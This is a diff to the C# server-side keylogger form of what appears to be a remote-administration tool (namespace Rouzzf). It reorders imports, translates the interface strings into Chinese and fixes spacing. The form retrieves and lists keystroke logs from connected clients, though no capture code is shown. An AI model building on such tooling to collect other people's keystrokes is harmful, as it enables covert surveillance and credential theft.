@@ -1,11 +1,11 @@
-﻿using System;
-using System.Collections.Generic;
-using System.IO;
-using System.Windows.Forms;
-using Rouzzf.Common.Messages;
+﻿using Rouzzf.Common.Messages;
 using Rouzzf.Server.Helper;
 using Rouzzf.Server.Messages;
 using Rouzzf.Server.Networking;
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Windows.Forms;
 
 namespace Rouzzf.Server.Forms
 {
@@ -107,12 +107,12 @@ namespace Rouzzf.Server.Forms
         {
             RefreshLogsDirectory();
             btnGetLogs.Enabled = true;
-            stripLblStatus.Text = "Status: " + message;
+            stripLblStatus.Text = "状态: " + message;
         }
 
         private void FrmKeylogger_Load(object sender, EventArgs e)
         {
-            this.Text = WindowHelper.GetWindowTitle("Keylogger", _connectClient);
+            this.Text = WindowHelper.GetWindowTitle("键盘记录器", _connectClient);
 
             if (!Directory.Exists(_baseDownloadPath))
             {
@@ -132,7 +132,7 @@ namespace Rouzzf.Server.Forms
         private void btnGetLogs_Click(object sender, EventArgs e)
         {
             btnGetLogs.Enabled = false;
-            stripLblStatus.Text = "Status: Retrieving logs...";
+            stripLblStatus.Text = "状态:正在检索日志...";
             _keyloggerHandler.RetrieveLogs();
         }
 
@@ -154,7 +154,7 @@ namespace Rouzzf.Server.Forms
 
             foreach (FileInfo file in iFiles)
             {
-                lstLogs.Items.Add(new ListViewItem {Text = file.Name});
+                lstLogs.Items.Add(new ListViewItem { Text = file.Name });
             }
         }
     }
